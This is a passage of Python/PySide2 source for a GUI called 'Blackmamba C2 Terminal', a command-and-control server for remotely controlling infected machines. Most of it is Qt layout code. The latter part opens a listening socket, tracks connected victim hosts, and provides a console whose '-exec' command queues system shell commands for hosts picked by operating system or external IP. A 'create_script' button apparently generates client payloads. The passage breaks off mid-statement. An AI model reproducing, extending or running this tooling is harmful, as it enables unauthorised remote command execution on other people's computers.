        sizePolicy4.setHeightForWidth(self.btn_save_2.sizePolicy().hasHeightForWidth())
        self.btn_save_2.setSizePolicy(sizePolicy4)
        self.btn_save_2.setMinimumSize(QSize(0, 60))
        self.btn_save_2.setFont(font2)
        self.btn_save_2.setLayoutDirection(Qt.LeftToRight)
        self.btn_save_2.setStyleSheet(u"QPushButton {	\n"
"    \n"
"	background-image: url(:/16x16/icons/16x16/cil-terminal.png);\n"
"	background-position: left center;\n"
"    background-repeat: no-repeat;\n"
"	border: none;\n"
"	border-left: 28px solid rgb(27, 29, 35);\n"
"	background-color: rgb(27, 29, 35);\n"
"	text-align: left;\n"
"	padding-left: 45px;\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(33, 37, 43);\n"
"	border-left: 28px solid rgb(33, 37, 43);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(85, 170, 255);\n"
"	border-left: 28px solid rgb(85, 170, 255);\n"
"}")

        self.verticalLayout_5.addWidget(self.btn_save_2)

        self.btn_new_3 = QPushButton(self.frame_left_menu)
        self.btn_new_3.setObjectName(u"btn_new_3")
        sizePolicy4.setHeightForWidth(self.btn_new_3.sizePolicy().hasHeightForWidth())
        self.btn_new_3.setSizePolicy(sizePolicy4)
        self.btn_new_3.setMinimumSize(QSize(0, 60))
        self.btn_new_3.setFont(font2)
        self.btn_new_3.setLayoutDirection(Qt.LeftToRight)
        self.btn_new_3.setStyleSheet(u"QPushButton {		\n"
"	background-image: url(:/16x16/icons/16x16/cil-user-follow.png);\n"
"	background-position: left center;\n"
"    background-repeat: no-repeat;\n"
"	border: none;\n"
"	border-left: 28px solid rgb(27, 29, 35);\n"
"	background-color: rgb(27, 29, 35);\n"
"	text-align: left;\n"
"	padding-left: 45px;\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(33, 37, 43);\n"
"	border-left: 28px solid rgb(33, 37, 43);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(85, 170, 255);\n"
"	border-left: 28px solid rgb(85, 170, 255);\n"
"}")

        self.verticalLayout_5.addWidget(self.btn_new_3)

        self.btn_new_4 = QPushButton(self.frame_left_menu)
        self.btn_new_4.setObjectName(u"btn_new_4")
        sizePolicy4.setHeightForWidth(self.btn_new_4.sizePolicy().hasHeightForWidth())
        self.btn_new_4.setSizePolicy(sizePolicy4)
        self.btn_new_4.setMinimumSize(QSize(0, 60))
        self.btn_new_4.setFont(font2)
        self.btn_new_4.setLayoutDirection(Qt.LeftToRight)
        self.btn_new_4.setStyleSheet(u"QPushButton {	\n"
"	background-image: url(:/16x16/icons/16x16/cil-link.png);\n"
"	background-position: left center;\n"
"    background-repeat: no-repeat;\n"
"	border: none;\n"
"	border-left: 28px solid rgb(27, 29, 35);\n"
"	background-color: rgb(27, 29, 35);\n"
"	text-align: left;\n"
"	padding-left: 45px;\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(33, 37, 43);\n"
"	border-left: 28px solid rgb(33, 37, 43);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(85, 170, 255);\n"
"	border-left: 28px solid rgb(85, 170, 255);\n"
"}")

        self.verticalLayout_5.addWidget(self.btn_new_4)

        self.frame_extra_menus = QFrame(self.frame_left_menu)
        self.frame_extra_menus.setObjectName(u"frame_extra_menus")
        sizePolicy3.setHeightForWidth(self.frame_extra_menus.sizePolicy().hasHeightForWidth())
        self.frame_extra_menus.setSizePolicy(sizePolicy3)
        self.frame_extra_menus.setFrameShape(QFrame.NoFrame)
        self.frame_extra_menus.setFrameShadow(QFrame.Raised)
        self.layout_menu_bottom = QVBoxLayout(self.frame_extra_menus)
        self.layout_menu_bottom.setSpacing(10)
        self.layout_menu_bottom.setObjectName(u"layout_menu_bottom")
        self.layout_menu_bottom.setContentsMargins(0, 0, 0, 25)

        self.verticalLayout_5.addWidget(self.frame_extra_menus, 0, Qt.AlignBottom)


        self.horizontalLayout_2.addWidget(self.frame_left_menu)

        self.frame_content_right = QFrame(self.frame_center)
        self.frame_content_right.setObjectName(u"frame_content_right")
        self.frame_content_right.setStyleSheet(u"background-color: rgb(44, 49, 60);")
        self.frame_content_right.setFrameShape(QFrame.NoFrame)
        self.frame_content_right.setFrameShadow(QFrame.Raised)
        self.verticalLayout_4 = QVBoxLayout(self.frame_content_right)
        self.verticalLayout_4.setSpacing(0)
        self.verticalLayout_4.setObjectName(u"verticalLayout_4")
        self.verticalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.frame_content = QFrame(self.frame_content_right)
        self.frame_content.setObjectName(u"frame_content")
        self.frame_content.setFrameShape(QFrame.NoFrame)
        self.frame_content.setFrameShadow(QFrame.Raised)
        self.verticalLayout_8 = QVBoxLayout(self.frame_content)
        self.verticalLayout_8.setObjectName(u"verticalLayout_8")
        self.stackedWidget = QStackedWidget(self.frame_content)
        self.stackedWidget.setObjectName(u"stackedWidget")
        self.stackedWidget.setStyleSheet(u"background: transparent;")
        self.page_home = QWidget()
        self.page_home.setObjectName(u"page_home")
        self.verticalLayout_10 = QVBoxLayout(self.page_home)
        self.verticalLayout_10.setObjectName(u"verticalLayout_10")
        self.label_6 = QLabel(self.page_home)
        self.label_6.setObjectName(u"label_6")
        font4 = QFont()
        font4.setFamily(u"Segoe UI")
        font4.setPointSize(40)
        self.label_6.setFont(font4)
        self.label_6.setStyleSheet(u"")
        self.label_6.setAlignment(Qt.AlignCenter)

        self.verticalLayout_10.addWidget(self.label_6)

        self.label = QLabel(self.page_home)
        self.label.setObjectName(u"label")
        font5 = QFont()
        font5.setFamily(u"Segoe UI")
        font5.setPointSize(14)
        self.label.setFont(font5)
        self.label.setAlignment(Qt.AlignCenter)

        self.verticalLayout_10.addWidget(self.label)

        self.label_7 = QLabel(self.page_home)
        self.label_7.setObjectName(u"label_7")
        font6 = QFont()
        font6.setFamily(u"Segoe UI")
        font6.setPointSize(15)
        self.label_7.setFont(font6)
        self.label_7.setAlignment(Qt.AlignCenter)

        self.verticalLayout_10.addWidget(self.label_7)

        self.stackedWidget.addWidget(self.page_home)
        self.page_widgets = QWidget()
        self.page_widgets.setObjectName(u"page_widgets")
        self.verticalLayout_6 = QVBoxLayout(self.page_widgets)
        self.verticalLayout_6.setObjectName(u"verticalLayout_6")
        self.frame_3 = QFrame(self.page_widgets)
        self.frame_3.setObjectName(u"frame_3")
        self.frame_3.setMinimumSize(QSize(0, 150))
        self.frame_3.setFrameShape(QFrame.StyledPanel)
        self.frame_3.setFrameShadow(QFrame.Raised)
        self.verticalLayout_13 = QVBoxLayout(self.frame_3)
        self.verticalLayout_13.setObjectName(u"verticalLayout_13")
        self.verticalLayout_13.setContentsMargins(9, 0, -1, 802)
        self.frame_div_content_1 = QFrame(self.frame_3)
        self.frame_div_content_1.setObjectName(u"frame_div_content_1")
        self.frame_div_content_1.setMinimumSize(QSize(872, 110))
        self.frame_div_content_1.setMaximumSize(QSize(16777215, 110))
        self.frame_div_content_1.setStyleSheet(u"background-color: rgb(41, 45, 56);\n"
"border-radius: 5px;\n"
"")
        self.frame_div_content_1.setFrameShape(QFrame.NoFrame)
        self.frame_div_content_1.setFrameShadow(QFrame.Raised)
        self.verticalLayout_11 = QVBoxLayout(self.frame_div_content_1)
        self.verticalLayout_11.setSpacing(0)
        self.verticalLayout_11.setObjectName(u"verticalLayout_11")
        self.verticalLayout_11.setContentsMargins(0, 0, 0, 0)
        self.frame_title_wid_2 = QFrame(self.frame_div_content_1)
        self.frame_title_wid_2.setObjectName(u"frame_title_wid_2")
        self.frame_title_wid_2.setMaximumSize(QSize(16777215, 35))
        self.frame_title_wid_2.setStyleSheet(u"background-color: rgb(39, 44, 54);")
        self.frame_title_wid_2.setFrameShape(QFrame.StyledPanel)
        self.frame_title_wid_2.setFrameShadow(QFrame.Raised)
        self.verticalLayout_12 = QVBoxLayout(self.frame_title_wid_2)
        self.verticalLayout_12.setObjectName(u"verticalLayout_12")
        self.labelBoxBlenderInstalation = QLabel(self.frame_title_wid_2)
        self.labelBoxBlenderInstalation.setObjectName(u"labelBoxBlenderInstalation")
        self.labelBoxBlenderInstalation.setFont(font1)
        self.labelBoxBlenderInstalation.setStyleSheet(u"")

        self.verticalLayout_12.addWidget(self.labelBoxBlenderInstalation)


        self.verticalLayout_11.addWidget(self.frame_title_wid_2)

        self.frame_content_wid_2 = QFrame(self.frame_div_content_1)
        self.frame_content_wid_2.setObjectName(u"frame_content_wid_2")
        self.frame_content_wid_2.setFrameShape(QFrame.NoFrame)
        self.frame_content_wid_2.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_11 = QHBoxLayout(self.frame_content_wid_2)
        self.horizontalLayout_11.setObjectName(u"horizontalLayout_11")
        self.gridLayout_2 = QGridLayout()
        self.gridLayout_2.setObjectName(u"gridLayout_2")
        self.gridLayout_2.setContentsMargins(-1, -1, -1, 0)
        self.lineEdit_2 = QLineEdit(self.frame_content_wid_2)
        self.lineEdit_2.setObjectName(u"lineEdit_2")
        self.lineEdit_2.setMinimumSize(QSize(0, 30))
        self.lineEdit_2.setStyleSheet(u"QLineEdit {\n"
"	background-color: rgb(27, 29, 35);\n"
"	border-radius: 5px;\n"
"	border: 2px solid rgb(27, 29, 35);\n"
"	padding-left: 10px;\n"
"}\n"
"QLineEdit:hover {\n"
"	border: 2px solid rgb(64, 71, 88);\n"
"}\n"
"QLineEdit:focus {\n"
"	border: 2px solid rgb(91, 101, 124);\n"
"}")

        self.gridLayout_2.addWidget(self.lineEdit_2, 0, 0, 1, 1)

        self.pushButton_2 = QPushButton(self.frame_content_wid_2)
        self.pushButton_2.setObjectName(u"pushButton_2")
        self.pushButton_2.setMinimumSize(QSize(150, 30))
        font7 = QFont()
        font7.setFamily(u"Segoe UI")
        font7.setPointSize(9)
        self.pushButton_2.setFont(font7)
        self.pushButton_2.setStyleSheet(u"QPushButton {\n"
"	border: 2px solid rgb(52, 59, 72);\n"
"	border-radius: 5px;	\n"
"	background-color: rgb(52, 59, 72);\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(57, 65, 80);\n"
"	border: 2px solid rgb(61, 70, 86);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(35, 40, 49);\n"
"	border: 2px solid rgb(43, 50, 61);\n"
"}")
        icon3 = QIcon()
        icon3.addFile(u":/16x16/icons/16x16/cil-save.png", QSize(), QIcon.Normal, QIcon.Off)
        self.pushButton_2.setIcon(icon3)

        self.gridLayout_2.addWidget(self.pushButton_2, 0, 1, 1, 1)

        self.labelVersion_4 = QLabel(self.frame_content_wid_2)
        self.labelVersion_4.setObjectName(u"labelVersion_4")
        self.labelVersion_4.setStyleSheet(u"color: rgb(98, 103, 111);")
        self.labelVersion_4.setLineWidth(1)
        self.labelVersion_4.setAlignment(Qt.AlignLeading|Qt.AlignLeft|Qt.AlignVCenter)

        self.gridLayout_2.addWidget(self.labelVersion_4, 1, 0, 1, 2)


        self.horizontalLayout_11.addLayout(self.gridLayout_2)


        self.verticalLayout_11.addWidget(self.frame_content_wid_2)


        self.verticalLayout_13.addWidget(self.frame_div_content_1)


        self.verticalLayout_6.addWidget(self.frame_3)

        self.stackedWidget.addWidget(self.page_widgets)
        self.page_console = QWidget()
        self.page_console.setObjectName(u"page_console")
        self.gridLayout_6 = QGridLayout(self.page_console)
        self.gridLayout_6.setObjectName(u"gridLayout_6")

######################################################################################################################

        self.horizontalLayout_99 = QHBoxLayout()
        self.horizontalLayout_99.setSpacing(0)
        self.horizontalLayout_99.setObjectName(u"horizontalLayout_99")
        self.horizontalLayout_99.setContentsMargins(0, 0, 0, 0)
        self.frame_div_content_22 = QFrame(self.page_console)
        self.frame_div_content_22.setObjectName(u"frame_div_content_22")
        self.frame_div_content_22.setMinimumSize(QSize(300, 590))
        self.frame_div_content_22.setMaximumSize(QSize(16777215, 16777215))
        self.frame_div_content_22.setStyleSheet(u"background-color: rgb(41, 45, 56);\n"
                                                "border-radius: 5px;\n"
                                                "")
        self.frame_div_content_22.setFrameShape(QFrame.NoFrame)
        self.frame_div_content_22.setFrameShadow(QFrame.Raised)
        self.verticalLayout_12 = QVBoxLayout(self.frame_div_content_22)
        self.verticalLayout_12.setSpacing(0)
        self.verticalLayout_12.setObjectName(u"verticalLayout_12")
        self.verticalLayout_12.setContentsMargins(0, 0, 0, 0)
        self.scrollArea_22 = QScrollArea(self.frame_div_content_22)
        self.scrollArea_22.setObjectName(u"scrollArea_22")
        self.scrollArea_22.setStyleSheet(u"background-color: rgb(27, 29, 35);\n"
                                         "border-radius: 5px;\n"
                                         "")
        self.scrollArea_22.setWidgetResizable(True)
        self.scrollAreaWidgetContents_33 = QWidget()
        self.scrollAreaWidgetContents_33.setObjectName(u"scrollAreaWidgetContents_33")
        self.scrollAreaWidgetContents_33.setGeometry(QRect(0, 0, 872, 596))
        self.gridLayout_7 = QGridLayout(self.scrollAreaWidgetContents_33)
        self.gridLayout_7.setObjectName(u"gridLayout_7")
        self.label_22 = QLabel(self.scrollAreaWidgetContents_33)
        self.label_22.setObjectName(u"label_22")
        self.label_22.setAlignment(Qt.AlignLeading | Qt.AlignLeft | Qt.AlignTop)

        self.gridLayout_7.addWidget(self.label_22, 0, 0, 1, 1)

        self.scrollArea_22.setWidget(self.scrollAreaWidgetContents_33)

        self.verticalLayout_12.addWidget(self.scrollArea_22)

        self.verticalSpacer_1 = QSpacerItem(7, 7, QSizePolicy.Minimum, QSizePolicy.Fixed)

        self.verticalLayout_12.addItem(self.verticalSpacer_1)

        self.lineEdit_1 = QLineEdit(self.frame_div_content_22)
        self.lineEdit_1.setObjectName(u"lineEdit_1")
        self.lineEdit_1.setMinimumSize(QSize(0, 30))
        self.lineEdit_1.setStyleSheet(u"QLineEdit {\n"
                                      "	background-color: rgb(27, 29, 35);\n"
                                      "	border-radius: 5px;\n"
                                      "	border: 2px solid rgb(27, 29, 35);\n"
                                      "	padding-left: 10px;\n"
                                      "}\n"
                                      "")

        self.verticalLayout_12.addWidget(self.lineEdit_1)

        self.horizontalLayout_99.addWidget(self.frame_div_content_22)
        self.gridLayout_6.addLayout(self.horizontalLayout_99, 0, 0, 1, 1)

        # resize

        self.frame_div_content_22.setMaximumSize(QSize(16777215, 16777215))
        self.frame_div_content_22.setMinimumSize(QSize(549, 20))

        self.label_22.setTextInteractionFlags(Qt.TextSelectableByMouse)
        self.label_22.setCursor(QCursor(QtCore.Qt.IBeamCursor))

        my_font = QFont('Consolas', 13)
        #my_font.setFamily("Terminus")
        self.label_22.setFont(my_font)
        self.lineEdit_1.setFont(my_font)

        with open('bin/profile/ccs_size.txt', 'r') as f:
            size_f = f.read()

        try:
            self.label_22.setStyleSheet(f'font-size: {int(size_f)}px;')
        except:
            self.label_22.setStyleSheet(f'font-size: 13px;')
######################################################################################################################
        #self.plainTextEdit = QPlainTextEdit(self.page_console)
        #self.plainTextEdit.setObjectName(u"plainTextEdit")
        #self.plainTextEdit.setMinimumSize(QSize(200, 200))
        #self.plainTextEdit.setStyleSheet(u"QPlainTextEdit {\n"
#"	background-color: rgb(27, 29, 35);\n"
#"	border-radius: 5px;\n"
#"	padding: 10px;\n"
#"}\n")
#"QPlainTextEdit:hover {\n"
#"	border: 2px solid rgb(64, 71, 88);\n"
#"}\n"
#"QPlainTextEdit:focus {\n"
#"	border: 2px solid rgb(91, 101, 124);\n"
#"}")
        #self.plainTextEdit.setReadOnly(True)

        #self.gridLayout_6.addWidget(self.plainTextEdit, 0, 0, 1, 1)

        #self.lineEdit_3 = QLineEdit(self.page_console)
        #self.lineEdit_3.setObjectName(u"lineEdit_3")
        #self.lineEdit_3.setMinimumSize(QSize(0, 30))
        #self.lineEdit_3.setStyleSheet(u"QLineEdit {\n"
#"	background-color: rgb(27, 29, 35);\n"
#"	border-radius: 5px;\n"
#"	border: 2px solid rgb(27, 29, 35);\n"
#"	padding-left: 10px;\n"
#"}\n")
#"QLineEdit:hover {\n"
#"	border: 2px solid rgb(64, 71, 88);\n"
#"}\n"
#"QLineEdit:focus {\n"
#"	border: 2px solid rgb(91, 101, 124);\n"
#"}")

        #self.gridLayout_6.addWidget(self.lineEdit_3, 1, 0, 1, 1)

        self.stackedWidget.addWidget(self.page_console)
        self.page_link = QWidget()
        self.page_link.setObjectName(u"page_link")
        self.gridLayout_3 = QGridLayout(self.page_link)
        self.gridLayout_3.setObjectName(u"gridLayout_3")
        self.gridLayout_3.setContentsMargins(0, -1, 0, -1)
        self.scrollArea = QScrollArea(self.page_link)
        self.scrollArea.setObjectName(u"scrollArea")
        self.scrollArea.setFrameShape(QFrame.NoFrame)
        self.scrollArea.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.scrollArea.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.scrollArea.setWidgetResizable(True)
        self.scrollAreaWidgetContents_2 = QWidget()
        self.scrollAreaWidgetContents_2.setObjectName(u"scrollAreaWidgetContents_2")
        self.scrollAreaWidgetContents_2.setGeometry(QRect(0, 0, 878, 845))
        self.gridLayout_4 = QGridLayout(self.scrollAreaWidgetContents_2)
        self.gridLayout_4.setObjectName(u"gridLayout_4")
        self.gridLayout_4.setHorizontalSpacing(6)
        self.gridLayout_4.setVerticalSpacing(11)
        self.gridLayout_4.setContentsMargins(1, 0, 17, 809)

        self.scrollArea.setWidget(self.scrollAreaWidgetContents_2)

        self.gridLayout_3.addWidget(self.scrollArea, 0, 0, 1, 1)

        self.stackedWidget.addWidget(self.page_link)

        self.verticalLayout_8.addWidget(self.stackedWidget)



        self.verticalLayout_4.addWidget(self.frame_content)

        self.frame_grip = QFrame(self.frame_content_right)
        self.frame_grip.setObjectName(u"frame_grip")
        self.frame_grip.setMinimumSize(QSize(0, 25))
        self.frame_grip.setMaximumSize(QSize(16777215, 25))
        self.frame_grip.setStyleSheet(u"background-color: rgb(33, 37, 43);")
        self.frame_grip.setFrameShape(QFrame.NoFrame)
        self.frame_grip.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_6 = QHBoxLayout(self.frame_grip)
        self.horizontalLayout_6.setSpacing(0)
        self.horizontalLayout_6.setObjectName(u"horizontalLayout_6")
        self.horizontalLayout_6.setContentsMargins(0, 0, 2, 0)
        self.frame_label_bottom = QFrame(self.frame_grip)
        self.frame_label_bottom.setObjectName(u"frame_label_bottom")
        self.frame_label_bottom.setFrameShape(QFrame.NoFrame)
        self.frame_label_bottom.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_7 = QHBoxLayout(self.frame_label_bottom)
        self.horizontalLayout_7.setSpacing(0)
        self.horizontalLayout_7.setObjectName(u"horizontalLayout_7")
        self.horizontalLayout_7.setContentsMargins(10, 0, 10, 0)
        self.label_credits = QLabel(self.frame_label_bottom)
        self.label_credits.setObjectName(u"label_credits")
        self.label_credits.setFont(font2)
        self.label_credits.setStyleSheet(u"color: rgb(98, 103, 111);")

        self.horizontalLayout_7.addWidget(self.label_credits)

        self.label_version = QLabel(self.frame_label_bottom)
        self.label_version.setObjectName(u"label_version")
        self.label_version.setMaximumSize(QSize(100, 16777215))
        self.label_version.setFont(font2)
        self.label_version.setStyleSheet(u"color: rgb(98, 103, 111);")
        self.label_version.setAlignment(Qt.AlignRight|Qt.AlignTrailing|Qt.AlignVCenter)

        self.horizontalLayout_7.addWidget(self.label_version)


        self.horizontalLayout_6.addWidget(self.frame_label_bottom)

        self.frame_size_grip = QFrame(self.frame_grip)
        self.frame_size_grip.setObjectName(u"frame_size_grip")
        self.frame_size_grip.setMaximumSize(QSize(20, 20))
        self.frame_size_grip.setStyleSheet(u"QSizeGrip {\n"
"	background-image: url(:/16x16/icons/16x16/cil-size-grip.png);\n"
"	background-position: center;\n"
"	background-repeat: no-reperat;\n"
"}")
        self.frame_size_grip.setFrameShape(QFrame.NoFrame)
        self.frame_size_grip.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_6.addWidget(self.frame_size_grip)
        self.verticalLayout_4.addWidget(self.frame_grip)
        self.horizontalLayout_2.addWidget(self.frame_content_right)
        self.verticalLayout.addWidget(self.frame_center)
        self.horizontalLayout.addWidget(self.frame_main)
        MainWindow.setCentralWidget(self.centralwidget)
        QWidget.setTabOrder(self.btn_minimize, self.btn_maximize_restore)
        QWidget.setTabOrder(self.btn_maximize_restore, self.btn_close)
        QWidget.setTabOrder(self.btn_close, self.btn_toggle_menu)
        self.retranslateUi(MainWindow)
        #self.stackedWidget.setCurrentIndex(3)
        self.stackedWidget.setCurrentIndex(0)
        QMetaObject.connectSlotsByName(MainWindow)

        self.horizontalLayout_12 = QHBoxLayout()
        self.horizontalLayout_12.setSpacing(8)
        self.horizontalLayout_12.setObjectName(u"horizontalLayout_12")
        self.horizontalLayout_12.setContentsMargins(-1, 3, -1, -1)
        self.lineEdit_7 = QLineEdit(self.frame_content_wid_2)
        self.lineEdit_7.setObjectName(u"lineEdit_7")
        self.lineEdit_7.setMinimumSize(QSize(248, 25))
        self.lineEdit_7.setMaximumSize(QSize(90, 16777215))
        self.lineEdit_7.setSizeIncrement(QSize(90, 0))
        self.lineEdit_7.setStyleSheet(u"QLineEdit {\n"
                                      "	background-color: rgb(27, 29, 35);\n"
                                      "	border-radius: 5px;\n"
                                      "	border: 2px solid rgb(27, 29, 35);\n"
                                      "	padding-left: 10px;\n"
                                      "}\n"
                                      "QLineEdit:hover {\n"
                                      "	border: 2px solid rgb(64, 71, 88);\n"
                                      "}\n"
                                      "QLineEdit:focus {\n"
                                      "	border: 2px solid rgb(91, 101, 124);\n"
                                      "}")

        self.horizontalLayout_12.addWidget(self.lineEdit_7)

        self.lineEdit_6 = QLineEdit(self.frame_content_wid_2)
        self.lineEdit_6.setObjectName(u"lineEdit_6")
        self.lineEdit_6.setMinimumSize(QSize(99, 25))
        self.lineEdit_6.setMaximumSize(QSize(58, 16777215))
        self.lineEdit_6.setStyleSheet(u"QLineEdit {\n"
                                      "	background-color: rgb(27, 29, 35);\n"
                                      "	border-radius: 5px;\n"
                                      "	border: 2px solid rgb(27, 29, 35);\n"
                                      "	padding-left: 10px;\n"
                                      "}\n"
                                      "QLineEdit:hover {\n"
                                      "	border: 2px solid rgb(64, 71, 88);\n"
                                      "}\n"
                                      "QLineEdit:focus {\n"
                                      "	border: 2px solid rgb(91, 101, 124);\n"
                                      "}")

        self.horizontalLayout_12.addWidget(self.lineEdit_6)

        self.lineEdit_5 = QLineEdit(self.frame_content_wid_2)
        self.lineEdit_5.setObjectName(u"lineEdit_5")
        self.lineEdit_5.setMinimumSize(QSize(99, 25))
        self.lineEdit_5.setMaximumSize(QSize(58, 16777215))
        self.lineEdit_5.setStyleSheet(u"QLineEdit {\n"
                                      "	background-color: rgb(27, 29, 35);\n"
                                      "	border-radius: 5px;\n"
                                      "	border: 2px solid rgb(27, 29, 35);\n"
                                      "	padding-left: 10px;\n"
                                      "}\n"
                                      "QLineEdit:hover {\n"
                                      "	border: 2px solid rgb(64, 71, 88);\n"
                                      "}\n"
                                      "QLineEdit:focus {\n"
                                      "	border: 2px solid rgb(91, 101, 124);\n"
                                      "}")

        self.horizontalLayout_12.addWidget(self.lineEdit_5)
        self.gridLayout_2.addLayout(self.horizontalLayout_12, 1, 0, 1, 2)
        self.horizontalLayout_12.setContentsMargins(0, 4, 390, 0)
        self.verticalLayout_13.setContentsMargins(0, 0, 9, 802)
        self.lineEdit_2.setPlaceholderText(
            QCoreApplication.translate("MainWindow", u"Ex: C:/Users/User/Documents", None))
        self.lineEdit_7.setPlaceholderText(QCoreApplication.translate("MainWindow", u"SERVER IP", None))
        self.lineEdit_6.setPlaceholderText(QCoreApplication.translate("MainWindow", u"PORT", None))
        self.lineEdit_5.setPlaceholderText(QCoreApplication.translate("MainWindow", u"VIDEO PORT", None))

        #############################################################################################################

        self.trds = []
        self.clients = []
        self.variables = []
        #self.HOST = ''  # localhost
        #self.PORT = 65000
        self.HOST = str(SERVER_IP)  # localhost
        self.PORT = int(PORT)
        self.s = socket(AF_INET, SOCK_STREAM)
        self.s.bind((self.HOST, self.PORT))
        self.s.listen(5)
        print("Server is running on " + str(self.PORT))
        self.run()

        self.refresh = False

        dir_path = str(os.path.dirname(os.path.realpath(__file__)))
        dir_path = dir_path.replace('\clientui', '')
        dir_path = dir_path.replace('/clientui', '')
        file_list = sorted(os.listdir(f"{dir_path}/bin/hosts"), key=len)

        self.selected = None

        position = 6
        scale = 1
        number_host = 0
        hosts_list = []
        self.host_array = []

        for hosts in file_list:
            hosts = hosts.replace('.txt', '')
            hosts_list.append(f'host_{number_host}')
            self.host_array.append([number_host, hosts])
            number_host += 1


        self.add_hosts()
        self.menu_hosts()

        self.btn_new_user2.clicked.connect(self.refr)
        self.btn_new_user.clicked.connect(self.menu_hosts)
        self.btn_save_2.clicked.connect(self.menu_shell)
        self.btn_new_3.clicked.connect(self.menu_add_host)
        self.btn_new_4.clicked.connect(self.menu_help)
        self.pushButton_2.clicked.connect(self.create_script)

        self.lineEdit_1.returnPressed.connect(self.shell_init)
        self.shell_history = []

        self.shell_help = ['-exec "<command>" -os <os_name>         Executes a command by os type.',
                           '-exec "<command>" -h <external_ip>      Executes a command by ip address.',
                           '-graph                                  Shows the OS list by percent.',
                           '-history                                Shows the history of commands.',
                           '-clear                                  Clear the terminal.',
                           '-fontsize <int>                         Sets the size of font.']

        self.label_22.setText('Blackmamba C2 Terminal. For more information type "-help".\n')

    def shell_init(self):
        command = self.lineEdit_1.text()

        gocs = self.label_22.text()
        if gocs == '' or gocs == ' ':
            self.label_22.setText(f'>>> {command}\n')
        else:
            self.label_22.setText(f'{gocs}\n>>> {command}\n')

        if command == '' or command == ' ' or command == '   ':
            return

        now = datetime.datetime.now()
        now_minute = now.minute

        if len(str(now_minute)) == 1:
            now_minute = '0' + str(now_minute)
        append_history = f'{now.hour}:{now_minute}   {command}'
        self.shell_history.insert(len(self.shell_history), append_history)

        if command == '-help':
            for e in self.shell_help:
                gocs = self.label_22.text()
                self.label_22.setText(f'{gocs}\n{e}')
            gocs = self.label_22.text()
            self.label_22.setText(f'{gocs}\n')
            self.lineEdit_1.clear()
            return

        elif command == '-history':
            for e in self.shell_history:
                gocs = self.label_22.text()
                self.label_22.setText(f'{gocs}\n{e}')
            gocs = self.label_22.text()
            self.label_22.setText(f'{gocs}\n')
            self.lineEdit_1.clear()
            return

        elif command.startswith('-fontsize'):
            fsize = str(command).replace('-fontsize', '').replace(' ','')
            self.lineEdit_1.clear()
            try:
                self.label_22.setStyleSheet(f'font-size: {int(fsize)}px;')
            except:
                self.label_22.setStyleSheet(f'font-size: 13px;')

            with open('bin/profile/ccs_size.txt', 'w') as hss:
                hss.write(fsize)
            return

        if command == '-graph':
            self.lineEdit_1.clear()
            os_list = []
            try:
                cwd = os.getcwd() + '/bin/hosts'
                list_hst = os.listdir(cwd)
            except:
                return

            for e in list_hst:
                try:
                    with open(f'{cwd}/{e}', 'r') as f:
                        content_fs = f.read().split('\n')
                        f.close()
                    os_list.append(content_fs[3].replace('system:', '').lower())
                except:
                    continue

            os_list_unique = list(set(os_list))
            result_percent = []

            for e in os_list_unique:
                find_pc = os_list.count(e)
                result_percent.append(f'{e}: {find_pc} host(s)')

            for e in result_percent:
                gcst = self.label_22.text()
                if gcst == '' or gcst == ' ':
                    self.label_22.setText(f'{e}')
                else:
                    self.label_22.setText(f'{gcst}\n{e}')

            gcst = self.label_22.text()
            self.label_22.setText(f'{gcst}\n')

            return

        elif command.startswith('-exec') and ' -os ' in command:
            self.lineEdit_1.clear()
            str_cm = command
            unique = ''
            command = command[command.find(' -os '):].replace('-os', '')
            command = command.lstrip().rstrip()

            for e in self.clients:
                try:
                    with open(f'bin/hosts/{e[2]}.txt', 'r') as f:
                        hinfo = f.read()
                        hinfo = str(hinfo).split('\n')
                        f.close()

                    tag_host = hinfo[1]

                    if tag_host == unique:
                        continue
                    else:
                        unique = tag_host

                    os_selected = command.lower()
                    '-exec "<command>" -h <external_ip>'

                    if os_selected in str(hinfo[4]).lower():
                        result = re.search('-exec "(.*)" -os', str(str_cm))
                        content = (result.group(1)).lstrip().rstrip()
                        print(content)

                        with open(f'bin/request/transfer/stdin/{tag_host.replace("tag:", "")}', 'w') as set_output:
                            set_output.write(f'[SYSTEM_SHELL]{content}')
                            set_output.close()

                        with open(f'bin/request/transfer/execute/{tag_host.replace("tag:", "")}', 'w') as set_execute:
                            set_execute.write('True')
                            set_execute.close()

                except:
                    return

        elif command.startswith('-exec') and ' -h ' in command:
            self.lineEdit_1.clear()
            str_cm = command
            unique = ''
            command = command[command.find(' -h '):].replace('-h', '')
            command = command.lstrip().rstrip()

            os_selected = command.lower()
            for e in self.clients:
                try:
                    with open(f'bin/hosts/{e[2]}.txt', 'r') as f:
                        hinfo = f.read()
                        hinfo = str(hinfo).split('\n')
                        f.close()

                    tag_host = hinfo[1]

                    if tag_host == unique:
                        continue
                    else:
                        unique = tag_host


                    external_ip = str(hinfo[10]).lower()
                    external_ip = external_ip.replace('external_ip:','')

                    print(f'---------------{os_selected}/{external_ip}')
                    if os_selected == external_ip:
                        result = re.search('-exec "(.*)" -h', str(str_cm))
                        content = (result.group(1)).lstrip().rstrip()
                        print(content)

                        with open(f'bin/request/transfer/stdin/{tag_host.replace("tag:", "")}', 'w') as set_output:
                            set_output.write(f'[SYSTEM_SHELL]{content}')
                            set_output.close()

                        with open(f'bin/request/transfer/execute/{tag_host.replace("tag:", "")}', 'w') as set_execute:
                            set_execute.write('True')
                            set_execute.close()

                except:
                    return


        elif command == '-clear' or command == 'clear':
            self.label_22.clear()
            self.lineEdit_1.clear()
            return

        else:
            gctfs = self.label_22.text()
            if gctfs == '' or gctfs == ' ':
                self.label_22.setText(
                    f'Invalid command or syntax, please try again. For more informations type "-help".\n')
            else:
                self.label_22.setText(
